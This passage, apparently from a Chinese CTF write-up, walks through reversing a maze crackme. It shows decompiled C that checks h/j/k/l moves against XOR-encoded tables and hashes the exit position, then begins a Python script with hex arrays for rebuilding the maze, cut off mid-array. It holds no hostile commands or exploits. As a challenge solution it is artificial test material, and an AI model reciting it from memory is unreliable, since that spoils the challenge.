<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strlen</span>(road) )</span><br><span class="line">  &#123;</span><br><span class="line">    LOWORD(v4) = <span class="number">0</span>;</span><br><span class="line">    LOWORD(v5) = <span class="number">0</span>;</span><br><span class="line">LABEL_21:	<span class="comment">// 找到迷宫的出口</span></span><br><span class="line">    <span class="keyword">if</span> ( (*(<span class="type">unsigned</span> __int8 *)(a1 - <span class="number">29</span>) ^ (<span class="number">16777619</span></span><br><span class="line">                                         * (*(<span class="type">unsigned</span> __int8 *)(a1 - <span class="number">30</span>) ^ (<span class="number">0x1000193</span></span><br><span class="line">                                                                           * (BYTE1(v5) ^ (<span class="number">16777619</span></span><br><span class="line">                                                                                         * ((<span class="type">unsigned</span> __int8)v5 ^ <span class="number">0x50C5D1F</span>))))))) != <span class="number">0x618FF339</span></span><br><span class="line">      &amp;&amp; (*(<span class="type">unsigned</span> __int8 *)(a1 - <span class="number">33</span>) ^ (<span class="number">16777619</span></span><br><span class="line">                                         * (*(<span class="type">unsigned</span> __int8 *)(a1 - <span class="number">34</span>) ^ (<span class="number">16777619</span></span><br><span class="line">                                                                           * (BYTE1(v4) ^ (<span class="number">16777619</span></span><br><span class="line">                                                                                         * ((<span class="type">unsigned</span> __int8)v4 ^ <span class="number">0x50C5D1F</span>))))))) != <span class="number">0x618FF339</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;:(&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">41</span>; ++i )</span><br><span class="line">      <span class="built_in">putchar</span>((<span class="type">unsigned</span> __int8)(*(_BYTE *)(a1 + i - <span class="number">128</span>) + *(_BYTE *)(a1 + i - <span class="number">84</span>)));</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(a1 - <span class="number">40</span>) = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    choice = road[v1];</span><br><span class="line">    <span class="keyword">switch</span> ( choice )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:                                 <span class="comment">// 向上</span></span><br><span class="line">        *(_DWORD *)(a1 - <span class="number">32</span>) = --v5;</span><br><span class="line">        v3 -= <span class="number">21</span>;</span><br><span class="line">        *(_DWORD *)(a1 - <span class="number">40</span>) = v3;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;j&#x27;</span>:                                 <span class="comment">// 向下</span></span><br><span class="line">        *(_DWORD *)(a1 - <span class="number">32</span>) = v5 + <span class="number">1</span>;</span><br><span class="line">        *(_DWORD *)(a1 - <span class="number">40</span>) = v3 + <span class="number">21</span>;</span><br><span class="line">        v4 = *(_DWORD *)(a1 - <span class="number">36</span>);</span><br><span class="line">        v5 = *(_DWORD *)(a1 - <span class="number">32</span>);</span><br><span class="line">        v3 = *(_DWORD *)(a1 - <span class="number">40</span>);</span><br><span class="line">        v1 = *(_DWORD *)(a1 - <span class="number">136</span>);</span><br><span class="line">        road = *(<span class="type">const</span> <span class="type">char</span> **)(a1 - <span class="number">132</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;k&#x27;</span>:                                 <span class="comment">// 向左</span></span><br><span class="line">        --v4;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;l&#x27;</span>:                                 <span class="comment">// 向右</span></span><br><span class="line">        ++v4;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)(a1 - <span class="number">36</span>) = v4;</span><br><span class="line">LABEL_12:</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt; <span class="number">0</span></span><br><span class="line">      || v4 &lt; <span class="number">0</span></span><br><span class="line">      || v5 &gt;= <span class="number">21</span></span><br><span class="line">      || v4 &gt;= <span class="number">21</span></span><br><span class="line">        <span class="comment">// 迷宫的生成</span></span><br><span class="line">      || (v5 ^ (v4 &lt;&lt; <span class="number">8</span>) ^ dword_4043C8[v3 + v4] ^ (<span class="type">unsigned</span> __int8)byte_404208[v3 + v4]) != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)(a1 - <span class="number">136</span>) = ++v1;</span><br><span class="line">    v7 = <span class="built_in">strlen</span>(road);</span><br><span class="line">    v3 = *(_DWORD *)(a1 - <span class="number">40</span>);</span><br><span class="line">    road = *(<span class="type">const</span> <span class="type">char</span> **)(a1 - <span class="number">132</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt;= v7 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以清晰得看到迷宫的生成和迷宫的出口，以下是生成迷宫的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s1 = [<span class="number">0x00000044</span>, <span class="number">0x00000124</span>, <span class="number">0x000002BD</span>, <span class="number">0x0000033E</span>, <span class="number">0x00000432</span>, <span class="number">0x0000059D</span>, <span class="number">0x0000068F</span>, <span class="number">0x00000753</span>, <span class="number">0x000008CC</span>,</span><br><span class="line">      <span class="number">0x0000094F</span>, <span class="number">0x00000A8D</span>, <span class="number">0x00000B2C</span>, <span class="number">0x00000C7C</span>, <span class="number">0x00000DF2</span>, <span class="number">0x00000EBA</span>, <span class="number">0x00000F30</span>, <span class="number">0x0000100D</span>, <span class="number">0x000011C7</span>,</span><br><span class="line">      <span class="number">0x00001257</span>, <span class="number">0x00001319</span>, <span class="number">0x00001491</span>, <span class="number">0x000000F4</span>, <span class="number">0x000001E7</span>, <span class="number">0x00000229</span>, <span class="number">0x0000034F</span>, <span class="number">0x000004EE</span>, <span class="number">0x00000547</span>,</span><br><span class="line">      <span class="number">0x0000067C</span>, <span class="number">0x000007D8</span>, <span class="number">0x000008F8</span>, <span class="number">0x000009D8</span>, <span class="number">0x00000A79</span>, <span class="number">0x00000BD1</span>, <span class="number">0x00000C7A</span>, <span class="number">0x00000D32</span>, <span class="number">0x00000E82</span>,</span><br><span class="line">      <span class="number">0x00000FD9</span>, <span class="number">0x000010DF</span>, <span class="number">0x00001120</span>, <span class="number">0x000012D6</span>, <span class="number">0x000013EE</span>, <span class="number">0x0000145F</span>, <span class="number">0x00000027</span>, <span class="number">0x0000016C</span>, <span class="number">0x00000265</span>,</span><br><span class="line">      <span class="number">0x000003B7</span>, <span class="number">0x0000049F</span>, <span class="number">0x0000054B</span>, <span class="number">0x000006C8</span>, <span class="number">0x000007DF</span>, <span class="number">0x00000866</span>, <span class="number">0x0000099F</span>, <span class="number">0x00000A0C</span>, <span class="number">0x00000B2D</span>,</span><br><span class="line">      <span class="number">0x00000C0C</span>, <span class="number">0x00000DBF</span>, <span class="number">0x00000E19</span>, <span class="number">0x00000F83</span>, <span class="number">0x000010F1</span>, <span class="number">0x00001169</span>, <span class="number">0x0000125C</span>, <span class="number">0x000013A3</span>, <span class="number">0x000014AE</span>,</span><br><span class="line">      <span class="number">0x0000000C</span>, <span class="number">0x00000164</span>, <span class="number">0x00000274</span>, <span class="number">0x0000033D</span>, <span class="number">0x000004BD</span>, <span class="number">0x00000582</span>, <span class="number">0x00000696</span>, <span class="number">0x00000784</span>, <span class="number">0x00000846</span>,</span><br><span class="line">      <span class="number">0x000009AB</span>, <span class="number">0x00000ABA</span>, <span class="number">0x00000BBA</span>, <span class="number">0x00000CFC</span>, <span class="number">0x00000DB7</span>, <span class="number">0x00000E18</span>, <span class="number">0x00000F96</span>, <span class="number">0x0000106C</span>, <span class="number">0x00001138</span>,</span><br><span class="line">      <span class="number">0x00001267</span>, <span class="number">0x000013F5</span>, <span class="number">0x00001481</span>, <span class="number">0x00000072</span>, <span class="number">0x0000010E</span>, <span class="number">0x0000022C</span>, <span class="number">0x000003AF</span>, <span class="number">0x00000489</span>, <span class="number">0x000005B3</span>,</span><br><span class="line">      <span class="number">0x000006B3</span>, <span class="number">0x000007C5</span>, <span class="number">0x0000080B</span>, <span class="number">0x0000091E</span>, <span class="number">0x00000A3E</span>, <span class="number">0x00000BF8</span>, <span class="number">0x00000C73</span>, <span class="number">0x00000D75</span>, <span class="number">0x00000EE2</span>,</span><br><span class="line">      <span class="number">0x00000F5A</span>, <span class="number">0x00001038</span>, <span class="number">0x0000119A</span>, <span class="number">0x000012E9</span>, <span class="number">0x0000133F</span>, <span class="number">0x00001487</span>, <span class="number">0x000000AA</span>, <span class="number">0x00000137</span>, <span class="number">0x00000298</span>,</span><br><span class="line">      <span class="number">0x00000346</span>, <span class="number">0x000004D3</span>, <span class="number">0x000005D5</span>, <span class="number">0x0000069E</span>, <span class="number">0x00000711</span>, <span class="number">0x000008B8</span>, <span class="number">0x0000097D</span>, <span class="number">0x00000AD9</span>, <span class="number">0x00000BD3</span>,</span><br><span class="line">      <span class="number">0x00000CC7</span>, <span class="number">0x00000D18</span>, <span class="number">0x00000E51</span>, <span class="number">0x00000FB7</span>, <span class="number">0x000010CB</span>, <span class="number">0x000011FC</span>, <span class="number">0x00001274</span>, <span class="number">0x00001396</span>, <span class="number">0x00001441</span>,</span><br><span class="line">      <span class="number">0x00000082</span>, <span class="number">0x000001A5</span>, <span class="number">0x0000025F</span>, <span class="number">0x000003E8</span>, <span class="number">0x00000487</span>, <span class="number">0x00000528</span>, <span class="number">0x000006F7</span>, <span class="number">0x00000797</span>, <span class="number">0x000008F3</span>,</span><br><span class="line">      <span class="number">0x000009AC</span>, <span class="number">0x00000ADC</span>, <span class="number">0x00000B65</span>, <span class="number">0x00000C73</span>, <span class="number">0x00000DE6</span>, <span class="number">0x00000EBC</span>, <span class="number">0x00000FCD</span>, <span class="number">0x000010C3</span>, <span class="number">0x000011AB</span>,</span><br><span class="line">      <span class="number">0x0000123F</span>, <span class="number">0x000013A0</span>, <span class="number">0x00001450</span>, <span class="number">0x00000043</span>, <span class="number">0x00000122</span>, <span class="number">0x000002AD</span>, <span class="number">0x000003CD</span>, <span class="number">0x0000042D</span>, <span class="number">0x00000537</span>,</span><br><span class="line">      <span class="number">0x00000692</span>, <span class="number">0x000007DB</span>, <span class="number">0x00000810</span>, <span class="number">0x00000936</span>, <span class="number">0x00000A49</span>, <span class="number">0x00000B65</span>, <span class="number">0x00000C3E</span>, <span class="number">0x00000DA3</span>, <span class="number">0x00000E1B</span>,</span><br><span class="line">      <span class="number">0x00000F95</span>, <span class="number">0x000010E6</span>, <span class="number">0x000011AF</span>, <span class="number">0x00001228</span>, <span class="number">0x000013B5</span>, <span class="number">0x00001448</span>, <span class="number">0x0000002F</span>, <span class="number">0x0000015B</span>, <span class="number">0x0000024E</span>,</span><br><span class="line">      <span class="number">0x0000032A</span>, <span class="number">0x000004D2</span>, <span class="number">0x0000053C</span>, <span class="number">0x000006D6</span>, <span class="number">0x000007C9</span>, <span class="number">0x0000082F</span>, <span class="number">0x00000957</span>, <span class="number">0x00000AE2</span>, <span class="number">0x00000B26</span>,</span><br><span class="line">      <span class="number">0x00000C98</span>, <span class="number">0x00000D57</span>, <span class="number">0x00000EC3</span>, <span class="number">0x00000FC2</span>, <span class="number">0x000010DE</span>, <span class="number">0x00001118</span>, <span class="number">0x000012AB</span>, <span class="number">0x00001386</span>, <span class="number">0x0000144F</span>,</span><br><span class="line">      <span class="number">0x000000D5</span>, <span class="number">0x000001C9</span>, <span class="number">0x000002F3</span>, <span class="number">0x000003E7</span>, <span class="number">0x000004C6</span>, <span class="number">0x000005C0</span>, <span class="number">0x000006C2</span>, <span class="number">0x000007D1</span>, <span class="number">0x000008F0</span>,</span><br><span class="line">      <span class="number">0x000009B0</span>, <span class="number">0x00000A1D</span>, <span class="number">0x00000B3D</span>, <span class="number">0x00000C2A</span>, <span class="number">0x00000D62</span>, <span class="number">0x00000E64</span>, <span class="number">0x00000F20</span>, <span class="number">0x000010FF</span>, <span class="number">0x000011EA</span>,</span><br><span class="line">      <span class="number">0x00001217</span>, <span class="number">0x000013F0</span>, <span class="number">0x000014F6</span>, <span class="number">0x000000E0</span>, <span class="number">0x000001F0</span>, <span class="number">0x000002E2</span>, <span class="number">0x0000037B</span>, <span class="number">0x00000456</span>, <span class="number">0x000005DE</span>,</span><br><span class="line">      <span class="number">0x000006E6</span>, <span class="number">0x00000772</span>, <span class="number">0x000008DF</span>, <span class="number">0x00000970</span>, <span class="number">0x00000A29</span>, <span class="number">0x00000B16</span>, <span class="number">0x00000C62</span>, <span class="number">0x00000DFB</span>, <span class="number">0x00000E33</span>,</span><br><span class="line">      <span class="number">0x00000F6A</span>, <span class="number">0x000010C8</span>, <span class="number">0x000011B2</span>, <span class="number">0x00001271</span>, <span class="number">0x000013F8</span>, <span class="number">0x000014C8</span>, <span class="number">0x000000A9</span>, <span class="number">0x00000192</span>, <span class="number">0x0000026F</span>,</span><br><span class="line">      <span class="number">0x00000342</span>, <span class="number">0x000004A7</span>, <span class="number">0x00000533</span>, <span class="number">0x0000065F</span>, <span class="number">0x00000707</span>, <span class="number">0x000008B9</span>, <span class="number">0x00000900</span>, <span class="number">0x00000ADC</span>, <span class="number">0x00000B90</span>,</span><br><span class="line">      <span class="number">0x00000C4C</span>, <span class="number">0x00000D7B</span>, <span class="number">0x00000E81</span>, <span class="number">0x00000FC7</span>, <span class="number">0x00001004</span>, <span class="number">0x0000118D</span>, <span class="number">0x000012C0</span>, <span class="number">0x00001375</span>, <span class="number">0x000014EB</span>,</span><br><span class="line">      <span class="number">0x000000A7</span>, <span class="number">0x00000147</span>, <span class="number">0x000002C6</span>, <span class="number">0x00000374</span>, <span class="number">0x0000044F</span>, <span class="number">0x000005EE</span>, <span class="number">0x0000066D</span>, <span class="number">0x00000719</span>, <span class="number">0x00000807</span>,</span><br><span class="line">      <span class="number">0x00000970</span>, <span class="number">0x00000A07</span>, <span class="number">0x00000BD5</span>, <span class="number">0x00000C18</span>, <span class="number">0x00000D4D</span>, <span class="number">0x00000EFE</span>, <span class="number">0x00000F20</span>, <span class="number">0x00001021</span>, <span class="number">0x0000116C</span>,</span><br><span class="line">      <span class="number">0x00001218</span>, <span class="number">0x000013CC</span>, <span class="number">0x0000144F</span>, <span class="number">0x000000A8</span>, <span class="number">0x00000117</span>, <span class="number">0x000002CA</span>, <span class="number">0x0000033F</span>, <span class="number">0x000004C5</span>, <span class="number">0x00000585</span>,</span><br><span class="line">      <span class="number">0x000006BB</span>, <span class="number">0x0000073A</span>, <span class="number">0x000008C8</span>, <span class="number">0x0000095A</span>, <span class="number">0x00000A8D</span>, <span class="number">0x00000B2F</span>, <span class="number">0x00000CC6</span>, <span class="number">0x00000DD8</span>, <span class="number">0x00000EFD</span>,</span><br><span class="line">      <span class="number">0x00000F73</span>, <span class="number">0x000010F8</span>, <span class="number">0x00001168</span>, <span class="number">0x00001280</span>, <span class="number">0x0000137E</span>, <span class="number">0x00001466</span>, <span class="number">0x000000AA</span>, <span class="number">0x00000194</span>, <span class="number">0x000002E0</span>,</span><br><span class="line">      <span class="number">0x000003A2</span>, <span class="number">0x000004B4</span>, <span class="number">0x0000057F</span>, <span class="number">0x00000640</span>, <span class="number">0x000007D0</span>, <span class="number">0x00000865</span>, <span class="number">0x00000986</span>, <span class="number">0x00000A38</span>, <span class="number">0x00000B13</span>,</span><br><span class="line">      <span class="number">0x00000C7C</span>, <span class="number">0x00000DBF</span>, <span class="number">0x00000EFE</span>, <span class="number">0x00000F95</span>, <span class="number">0x00001066</span>, <span class="number">0x00001117</span>, <span class="number">0x000012BE</span>, <span class="number">0x00001373</span>, <span class="number">0x000014E4</span>,</span><br><span class="line">      <span class="number">0x000000F9</span>, <span class="number">0x0000015F</span>, <span class="number">0x0000026C</span>, <span class="number">0x000003DF</span>, <span class="number">0x00000434</span>, <span class="number">0x00000569</span>, <span class="number">0x00000658</span>, <span class="number">0x00000768</span>, <span class="number">0x000008B4</span>,</span><br><span class="line">      <span class="number">0x00000976</span>, <span class="number">0x00000A56</span>, <span class="number">0x00000B68</span>, <span class="number">0x00000CBF</span>, <span class="number">0x00000DCB</span>, <span class="number">0x00000E81</span>, <span class="number">0x00000FE7</span>, <span class="number">0x00001062</span>, <span class="number">0x00001196</span>,</span><br><span class="line">      <span class="number">0x00001233</span>, <span class="number">0x000013FE</span>, <span class="number">0x00001486</span>, <span class="number">0x000000E7</span>, <span class="number">0x000001AF</span>, <span class="number">0x00000205</span>, <span class="number">0x00000371</span>, <span class="number">0x00000482</span>, <span class="number">0x000005F0</span>,</span><br><span class="line">      <span class="number">0x00000670</span>, <span class="number">0x0000072E</span>, <span class="number">0x00000849</span>, <span class="number">0x00000925</span>, <span class="number">0x00000A5B</span>, <span class="number">0x00000B0E</span>, <span class="number">0x00000C7F</span>, <span class="number">0x00000D75</span>, <span class="number">0x00000EF4</span>,</span><br><span class="line">      <span class="number">0x00000F61</span>, <span class="number">0x0000101D</span>, <span class="number">0x0000116B</span>, <span class="number">0x0000127E</span>, <span class="number">0x00001382</span>, <span class="number">0x00001404</span>, <span class="number">0x0000004D</span>, <span class="number">0x0000015C</span>, <span class="number">0x0000027F</span>,</span><br><span class="line">      <span class="number">0x0000033F</span>, <span class="number">0x00000442</span>, <span class="number">0x000005B6</span>, <span class="number">0x0000064D</span>, <span class="number">0x00000780</span>, <span class="number">0x0000086B</span>, <span class="number">0x000009DC</span>, <span class="number">0x00000AF1</span>, <span class="number">0x00000B79</span>,</span><br><span class="line">      <span class="number">0x00000C66</span>, <span class="number">0x00000D6E</span>, <span class="number">0x00000E9D</span>, <span class="number">0x00000F23</span>, <span class="number">0x0000107B</span>, <span class="number">0x00001126</span>, <span class="number">0x000012D5</span>, <span class="number">0x0000133F</span>, <span class="number">0x000014AE</span>,</span><br><span class="line">      <span class="number">0x0000007D</span>, <span class="number">0x000001AD</span>, <span class="number">0x000002BB</span>, <span class="number">0x000003A1</span>, <span class="number">0x00000473</span>, <span class="number">0x0000054E</span>, <span class="number">0x000006C0</span>, <span class="number">0x000007D0</span>, <span class="number">0x0000083F</span>,</span><br><span class="line">      <span class="number">0x000009DA</span>, <span class="number">0x00000AE6</span>, <span class="number">0x00000BA9</span>, <span class="number">0x00000CA0</span>, <span class="number">0x00000DC3</span>, <span class="number">0x00000E30</span>, <span class="number">0x00000F8E</span>, <span class="number">0x00001066</span>, <span class="number">0x000011CD</span>,</span><br><span class="line">      <span class="number">0x0000124B</span>, <span class="number">0x00001361</span>, <span class="number">0x000014B8</span>, <span class="number">0x000000EE</span>, <span class="number">0x0000016D</span>, <span class="number">0x00000275</span>, <span class="number">0x0000033C</span>, <span class="number">0x00000473</span>, <span class="number">0x000005A8</span>,</span><br><span class="line">      <span class="number">0x00000679</span>, <span class="number">0x00000759</span>, <span class="number">0x0000080B</span>, <span class="number">0x000009B4</span>, <span class="number">0x00000AC7</span>, <span class="number">0x00000B03</span>, <span class="number">0x00000C07</span>, <span class="number">0x00000DAE</span>, <span class="number">0x00000E82</span>,</span><br><span class="line">      <span class="number">0x00000FF8</span>, <span class="number">0x00001050</span>, <span class="number">0x000011DF</span>, <span class="number">0x00001261</span>, <span class="number">0x000013A0</span>, <span class="number">0x000014D5</span>, <span class="number">0x00000053</span>, <span class="number">0x000001B7</span>, <span class="number">0x000002D8</span>,</span><br><span class="line">      <span class="number">0x000003B8</span>, <span class="number">0x00000478</span>, <span class="number">0x000005BC</span>, <span class="number">0x000006CC</span>, <span class="number">0x000007DE</span>, <span class="number">0x000008C6</span>, <span class="number">0x00000990</span>, <span class="number">0x00000A3F</span>, <span class="number">0x00000B21</span>,</span><br><span class="line">      <span class="number">0x00000CBF</span>, <span class="number">0x00000DBB</span>, <span class="number">0x00000EDC</span>, <span class="number">0x00000FB1</span>, <span class="number">0x0000103B</span>, <span class="number">0x0000116B</span>, <span class="number">0x0000126B</span>, <span class="number">0x000013E0</span>, <span class="number">0x00001434</span>]</span><br><span class="line"></span><br><span class="line">s2 = [<span class="number">0x45</span>, <span class="number">0x24</span>, <span class="number">0xBD</span>, <span class="number">0x3E</span>, <span class="number">0x32</span>, <span class="number">0x9D</span>, <span class="number">0x8F</span>, <span class="number">0x53</span>, <span class="number">0xCC</span>, <span class="number">0x4F</span>, <span class="number">0x8D</span>, <span class="number">0x2C</span>, <span class="number">0x7C</span>, <span class="number">0xF2</span>, <span class="number">0xBA</span>, <span class="number">0x30</span>, <span class="number">0x0D</span>, <span class="number">0xC7</span>,</span><br><span class="line">      <span class="number">0x57</span>, <span class="number">0x19</span>, <span class="number">0x91</span>, <span class="number">0xF4</span>, <span class="number">0xE6</span>, <span class="number">0x28</span>, <span class="number">0x4F</span>, <span class="number">0xEE</span>, <span class="number">0x47</span>, <span class="number">0x7C</span>, <span class="number">0xD8</span>, <span class="number">0xF8</span>, <span class="number">0xD8</span>, <span class="number">0x79</span>, <span class="number">0xD1</span>, <span class="number">0x7A</span>, <span class="number">0x32</span>, <span class="number">0x82</span>,</span><br><span class="line">      <span class="number">0xD9</span>, <span class="number">0xDF</span>, <span class="number">0x20</span>, <span class="number">0xD6</span>, <span class="number">0xEF</span>, <span class="number">0x5E</span>, <span class="number">0x24</span>, <span class="number">0x6E</span>, <span class="number">0x67</span>, <span class="number">0xB4</span>, <span class="number">0x9D</span>, <span class="number">0x49</span>, <span class="number">0xCA</span>, <span class="number">0xDD</span>, <span class="number">0x64</span>, <span class="number">0x9D</span>, <span class="number">0x0E</span>, <span class="number">0x2F</span>,</span><br><span class="line">      <span class="number">0x0E</span>, <span class="number">0xBD</span>, <span class="number">0x1B</span>, <span class="number">0x81</span>, <span class="number">0xF3</span>, <span class="number">0x6B</span>, <span class="number">0x5F</span>, <span class="number">0xA1</span>, <span class="number">0xAC</span>, <span class="number">0x0E</span>, <span class="number">0x66</span>, <span class="number">0x76</span>, <span class="number">0x3F</span>, <span class="number">0xBF</span>, <span class="number">0x80</span>, <span class="number">0x94</span>, <span class="number">0x86</span>, <span class="number">0x44</span>,</span><br><span class="line">      <span class="number">0xA9</span>, <span class="number">0xB8</span>, <span class="number">0xB8</span>, <span class="number">0xFE</span>, <span class="number">0xB5</span>, <span class="number">0x1A</span>, <span class="number">0x94</span>, <span class="number">0x6F</span>, <span class="number">0x3B</span>, <span class="number">0x64</span>, <span class="number">0xF6</span>, <span class="number">0x82</span>, <span class="number">0x76</span>, <span class="number">0x0A</span>, <span class="number">0x28</span>, <span class="number">0xAB</span>, <span class="number">0x8D</span>, <span class="number">0xB7</span>,</span><br><span class="line">      <span class="number">0xB7</span>, <span class="number">0xC1</span>, <span class="number">0x0F</span>, <span class="number">0x1A</span>, <span class="number">0x3A</span>, <span class="number">0xFC</span>, <span class="number">0x77</span>, <span class="number">0x71</span>, <span class="number">0xE6</span>, <span class="number">0x5F</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0xEC</span>, <span class="number">0x3A</span>, <span class="number">0x83</span>, <span class="number">0xAF</span>, <span class="number">0x32</span>, <span class="number">0x9D</span>,</span><br><span class="line">      <span class="number">0x43</span>, <span class="number">0xD6</span>, <span class="number">0xD0</span>, <span class="number">0x9B</span>, <span class="number">0x14</span>, <span class="number">0xBD</span>, <span class="number">0x78</span>, <span class="number">0xDC</span>, <span class="number">0xD6</span>, <span class="number">0xC2</span>, <span class="number">0x1D</span>, <span class="number">0x54</span>, <span class="number">0xB3</span>, <span class="number">0xCE</span>, <span class="number">0xF8</span>, <span class="number">0x71</span>, <span class="number">0x92</span>, <span class="number">0x44</span>,</span><br><span class="line">      <span class="number">0x85</span>, <span class="number">0xA2</span>, <span class="number">0x58</span>, <span class="number">0xEF</span>, <span class="number">0x80</span>, <span class="number">0x2F</span>, <span class="number">0xF0</span>, <span class="number">0x90</span>, <span class="number">0xF4</span>, <span class="number">0xAB</span>, <span class="number">0xDB</span>, <span class="number">0x63</span>, <span class="number">0x74</span>, <span class="number">0xE1</span>, <span class="number">0xBB</span>, <span class="number">0xCA</span>, <span class="number">0xC5</span>, <span class="number">0xAC</span>,</span><br><span class="line">      <span class="number">0x39</span>, <span class="number">0xA7</span>, <span class="number">0x56</span>, <span class="number">0x45</span>, <span class="number">0x25</span>, <span class="number">0xAA</span>, <span class="number">0xCA</span>, <span class="number">0x2A</span>, <span class="number">0x30</span>, <span class="number">0x95</span>, <span class="number">0xDC</span>, <span class="number">0x17</span>, <span class="number">0x31</span>, <span class="number">0x4F</span>, <span class="number">0x62</span>, <span class="number">0x39</span>, <span class="number">0xA4</span>, <span class="number">0x1C</span>,</span><br><span class="line">      <span class="number">0x93</span>, <span class="number">0xE1</span>, <span class="number">0xA9</span>, <span class="number">0x2F</span>, <span class="number">0xB3</span>, <span class="number">0x4F</span>, <span class="number">0x26</span>, <span class="number">0x53</span>, <span class="number">0x47</span>, <span class="number">0x23</span>, <span class="number">0xDB</span>, <span class="number">0x34</span>, <span class="number">0xDE</span>, <span class="number">0xC1</span>, <span class="number">0x27</span>, <span class="number">0x5F</span>, <span class="number">0xEB</span>, <span class="number">0x2E</span>,</span><br><span class="line">      <span class="number">0x91</span>, <span class="number">0x5E</span>, <span class="number">0xCA</span>, <span class="number">0xCB</span>, <span class="number">0xD6</span>, <span class="number">0x11</span>, <span class="number">0xA3</span>, <span class="number">0x8F</span>, <span class="number">0x47</span>, <span class="number">0xDD</span>, <span class="number">0xC0</span>, <span class="number">0xFB</span>, <span class="number">0xEE</span>, <span class="number">0xCF</span>, <span class="number">0xC9</span>, <span class="number">0xCA</span>, <span class="number">0xD9</span>, <span class="number">0xF8</span>,</span><br><span class="line">      <span class="number">0xB9</span>, <span class="number">0x15</span>, <span class="number">0x34</span>, <span class="number">0x23</span>, <span class="number">0x6B</span>, <span class="number">0x6D</span>, <span class="number">0x28</span>, <span class="number">0xF6</span>, <span class="number">0xE2</span>, <span class="number">0x1E</span>, <span class="number">0xF8</span>, <span class="number">0xFF</span>, <span class="number">0xEB</span>, <span class="number">0xFB</span>, <span class="number">0xE9</span>, <span class="number">0x70</span>, <span class="number">0x5C</span>, <span class="number">0xD4</span>,</span><br><span class="line">      <span class="number">0xED</span>, <span class="number">0x78</span>, <span class="number">0xD4</span>, <span class="number">0x7A</span>, <span class="number">0x22</span>, <span class="number">0x1C</span>, <span class="number">0x69</span>, <span class="number">0xF1</span>, <span class="number">0x39</span>, <span class="number">0x61</span>, <span class="number">0xC2</span>, <span class="number">0xB9</span>, <span class="number">0x7B</span>, <span class="number">0xF3</span>, <span class="number">0xC2</span>, <span class="number">0xA2</span>, <span class="number">0x99</span>, <span class="number">0x64</span>,</span><br><span class="line">      <span class="number">0x48</span>, <span class="number">0xAC</span>, <span class="number">0x38</span>, <span class="number">0x55</span>, <span class="number">0x0C</span>, <span class="number">0xB3</span>, <span class="number">0x0B</span>, <span class="number">0xD6</span>, <span class="number">0x9B</span>, <span class="number">0x46</span>, <span class="number">0x70</span>, <span class="number">0x8B</span>, <span class="number">0xCD</span>, <span class="number">0x0F</span>, <span class="number">0x87</span>, <span class="number">0xCB</span>, <span class="number">0x7F</span>, <span class="number">0xE0</span>,</span><br><span class="line">      <span class="number">0xAB</span>, <span class="number">0x4A</span>, <span class="number">0xCB</span>, <span class="number">0x79</span>, <span class="number">0x43</span>, <span class="number">0xE2</span>, <span class="number">0x60</span>, <span class="number">0x15</span>, <span class="number">0x0A</span>, <span class="number">0x7C</span>, <span class="number">0x0A</span>, <span class="number">0xD9</span>, <span class="number">0x15</span>, <span class="number">0x41</span>, <span class="number">0xF3</span>, <span class="number">0x2C</span>, <span class="number">0x2C</span>, <span class="number">0x61</span>,</span><br><span class="line">      <span class="number">0x14</span>, <span class="number">0xC1</span>, <span class="number">0x43</span>, <span class="number">0xA5</span>, <span class="number">0x1A</span>, <span class="number">0xC7</span>, <span class="number">0x33</span>, <span class="number">0xC9</span>, <span class="number">0x89</span>, <span class="number">0xB7</span>, <span class="number">0x37</span>, <span class="number">0xC4</span>, <span class="number">0x57</span>, <span class="number">0x81</span>, <span class="number">0x23</span>, <span class="number">0xCA</span>, <span class="number">0xD4</span>, <span class="number">0xF1</span>,</span><br><span class="line">      <span class="number">0x7E</span>, <span class="number">0xF4</span>, <span class="number">0x65</span>, <span class="number">0x8D</span>, <span class="number">0x72</span>, <span class="number">0x6B</span>, <span class="number">0xA4</span>, <span class="number">0x9A</span>, <span class="number">0xEE</span>, <span class="number">0xAC</span>, <span class="number">0xBA</span>, <span class="number">0x71</span>, <span class="number">0x4E</span>, <span class="number">0xDE</span>, <span class="number">0x6A</span>, <span class="number">0x88</span>, <span class="number">0x36</span>, <span class="number">0x1D</span>,</span><br><span class="line">      <span class="number">0x72</span>, <span class="number">0xB1</span>, <span class="number">0xF0</span>, <span class="number">0x9B</span>, <span class="number">0x69</span>, <span class="number">0x19</span>, <span class="number">0xB0</span>, <span class="number">0x7C</span>, <span 